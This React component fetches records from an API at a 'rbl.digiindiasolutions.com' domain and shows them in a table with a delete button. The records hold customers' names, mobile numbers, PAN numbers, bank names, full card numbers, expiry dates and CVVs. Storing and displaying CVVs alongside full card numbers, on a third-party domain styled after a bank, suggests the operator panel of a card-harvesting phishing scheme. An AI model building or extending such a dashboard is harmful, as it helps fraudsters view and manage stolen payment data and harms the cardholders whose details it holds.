import axios from 'axios';
import React, { useEffect, useState } from 'react';
import toast, { Toaster } from 'react-hot-toast';
import { ToastContainer, toast as toastify } from 'react-toastify';
import 'react-toastify/dist/ReactToastify.css';
import 'tailwindcss/tailwind.css';

function PersonalInfo() {
  const [personalInfo, setPersonalInfo] = useState([]);

  const personalInfoFetch = async () => {
    try {
      const response = await axios.get('https://www.rbl.digiindiasolutions.com/v1/getPersonalInfo');
      console.log(response.data.PersonalInfo);
      setPersonalInfo(response.data.PersonalInfo);
    } catch (error) {
      console.log(error);
      toast.error('Failed to fetch personal information');
    }
  };

  const handledelete = async (_id) => {
    const confirmDelete = window.confirm("Are you sure you want to delete this personal detail?");
    if (!confirmDelete) return;

    try {
      const response = await axios.delete(`https://www.rbl.digiindiasolutions.com/v1/deletePersonalInfo/${_id}`);
      console.log(response.data);
      toast.success('Personal Detail Deleted');
      // Refresh the personal info list
      personalInfoFetch();
    } catch (error) {
      console.log(error);
      toast.error('Internal Error');
    }
  };

  useEffect(() => {
    personalInfoFetch();
  }, []);

  return (
    <section className="p-6 bg-gray-100 min-h-screen">
      <ToastContainer />
      <Toaster />
      <div className="overflow-x-auto">
        <table className="min-w-full bg-white border border-gray-200 rounded-lg shadow-md">
          <thead>
            <tr className="bg-gray-200 text-gray-600 uppercase text-sm leading-normal">
              <th className="py-3 whitespace-nowrap px-6 text-left">Name</th>
              {/* <th className="py-3 whitespace-nowrap px-6 text-left">Email</th> */}
              <th className="py-3 whitespace-nowrap px-6 text-left">Mobile No.</th>
              <th className="py-3 whitespace-nowrap px-6 text-left">Pan Card Number</th>
              {/* <th className="py-3 whitespace-nowrap px-6 text-left">Postal Code</th> */}
              {/* <th className="py-3 whitespace-nowrap px-6 text-left">Reference Number</th> */}
              <th className="py-3 whitespace-nowrap px-6 text-left">Credit Limit</th>
              <th className="py-3 whitespace-nowrap px-6 text-left">Total Amount Due</th>
              <th className="py-3 whitespace-nowrap px-6 text-left">Bank Name</th>
              <th className="py-3 whitespace-nowrap px-6 text-left">Card Holder Name</th>
              <th className="py-3 whitespace-nowrap px-6 text-left">Card Number</th>
              <th className="py-3 whitespace-nowrap px-6 text-left">Expiry Month</th>
              <th className="py-3 whitespace-nowrap px-6 text-left">Expiry Year</th>
              <th className="py-3 whitespace-nowrap px-6 text-left">CVV</th>
              <th className="py-3 whitespace-nowrap px-6 text-left">Delete</th>
            </tr>
          </thead>
          <tbody className="text-gray-600 text-sm font-light">
            {personalInfo && personalInfo.map((item, index) => (
              <tr key={index} className="border-b border-gray-200 hover:bg-gray-100">
                <td className="py-3 px-6 text-left whitespace-nowrap">{item.name}</td>
                {/* <td className="py-3 px-6 text-left whitespace-nowrap">{item.email}</td> */}
                <td className="py-3 px-6 text-left whitespace-nowrap">{item.number}</td>
                <td className="py-3 px-6 text-left whitespace-nowrap">{item.panCardNumber}</td>
                <td className="py-3 px-6 text-left whitespace-nowrap">{item.creditLimit}</td>
                <td className="py-3 px-6 text-left whitespace-nowrap">{item.totalAmountDue}</td>
                <td className="py-3 px-6 text-left whitespace-nowrap">{item.bankName}</td>
                <td className="py-3 px-6 text-left whitespace-nowrap">{item.cardHolderName}</td>
                <td className="py-3 px-6 text-left whitespace-nowrap">{item.cardNumber}</td>
                <td className="py-3 px-6 text-left whitespace-nowrap">{item.expiryMonth}</td>
                <td className="py-3 px-6 text-left whitespace-nowrap">{item.expiryYear}</td>
                <td className="py-3 px-6 text-left whitespace-nowrap">{item.cvv}</td>
                {/* <td className="py-3 px-6 text-left whitespace-nowrap">{item.postalCode}</td> */}
                {/* <td className="py-3 px-6 text-left whitespace-nowrap">{item.referenceNumber}</td> */}
                <td className="py-3 px-6 text-left whitespace-nowrap">
                  <button onClick={() => handledelete(item._id)} className="bg-red-500 text-white py-2 px-4 rounded-lg hover:bg-red-700 transition-all">
                    Delete
                  </button>
                </td>
              </tr>
            ))}
          </tbody>
        </table>
      </div>
    </section>
  );
}

export default PersonalInfo;
